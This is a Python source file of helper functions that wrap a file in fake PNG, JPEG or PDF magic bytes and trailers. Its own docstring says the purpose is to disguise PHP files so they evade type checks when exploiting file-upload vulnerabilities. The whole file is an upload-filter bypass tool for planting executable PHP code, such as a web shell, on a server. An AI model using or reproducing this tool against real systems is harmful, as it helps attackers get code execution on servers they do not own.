def get_file_content(filename, mode):
    try:
        with open(filename, mode) as f:
            file_content = f.readlines()
            return file_content
    except FileNotFoundError:
        print('Error: File {} not found.'.format(filename))
        return None


def write_to_file(filename, mode, content):
    try:
        with open(filename, mode) as f:
            for line in content:
                f.write(line)
    except FileNotFoundError:
        print('Error: File {} not found.'.format(filename))
        return 
    except:
        print('Some error occurred during writing to file.')
        exit(1)


def _png_sig_impose(filename):
    '''
    The first eight bytes of a PNG file always contain the following values:
    (hexadecimal)           89  50  4e  47  0d  0a  1a  0a
        Actually adding this 8 bytes enough to make exiftool thinks that our file is PNG,
        but with Waring about absence of IHDR chunk
    '''
    file_content = get_file_content(filename, 'rb')
    if not file_content:
        return False
    signature_to_inject = b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'
    IHDR_chunk = b'\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x03\x48\x00\x00\x03\x5b\x08\x06\x00\x00\x00\x78\xa5\xbf\xee'
    result = [signature_to_inject, IHDR_chunk]
    result += file_content
    write_to_file(filename, 'wb', result)
    return True


def _jpg_sig_impose(filename):
    '''
    0xFF, 0xD8 - Start of Image
    0xFF, 0xD9 - End Of Image
    '''
    file_content = get_file_content(filename, 'rb')
    if not file_content:
        return False
    head = b'\xff\xd8\xff\xe1'
    tail = b'\xff\xd9'
    result = [head,]
    result += file_content
    result.append(tail)
    write_to_file(filename, 'wb', result)
    return True


def _pdf_sig_impose(filename):
    '''
        The file starts with a header containing a magic number (as a readable string) and the version of the format,
    for example %PDF-1.5. == 25 50 44 46 2D 31 2E 35 0A
        At the end of a PDF file is a footer containing: 
    The startxref keyword followed by an offset to the start of the cross-reference table (starting with the xref keyword)
    or the cross-reference stream object, followed by The %%EOF end-of-file marker.
    strartxref%%EOF == 73 74 61 72 74 78 72 65 66 0A 39 33 37 36 37 31 33 0A 25 25 45 4F 46 0A
    '''
    file_content = get_file_content(filename, 'rb')
    if not file_content:
        return False
    signature_to_inject = b'\x25\x50\x44\x46\x2d\x31\x2e\x35\x0a'
    tail = b'\x73\x74\x61\x72\x74\x78\x72\x65\x66\x0A\x39\x33\x37\x36\x37\x31\x33\x0A\x25\x25\x45\x4F\x46\x0A'
    result = [signature_to_inject, ]
    result += file_content
    result.append(tail)
    write_to_file(filename, 'wb', result)
    return True


def impose_signatue(filename, extension):
        '''
        In context of php files we can inject bytes that are used as signature for other types
        to evaide checks during exploiting file uploading vulnerabilities:
         "The PHP interpreter only executes PHP code within its delimiters. Anything outside of its 
         delimiters is not processed by PHP, although non-PHP text is still subject to control 
         structures described in PHP code. The most common delimiters are <?php to open and ?> to close PHP sections."
        '''
        if extension == 'png':
            _png_sig_impose(filename)
        elif extension == 'jpg':
            _jpg_sig_impose(filename)
        elif extension == 'pdf':
            _pdf_sig_impose(filename)